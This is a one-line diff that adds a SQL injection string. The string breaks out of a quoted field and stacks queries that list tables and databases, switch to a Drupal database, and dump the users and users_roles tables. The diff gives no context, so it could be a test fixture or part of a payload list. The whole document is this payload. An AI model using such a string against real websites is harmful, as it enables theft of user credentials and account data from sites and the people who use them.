@@ -1,0 +1,1 @@
+';show tables;select * from users;show databases;use drupal; show tables;select * from users; select * from users_roles;--
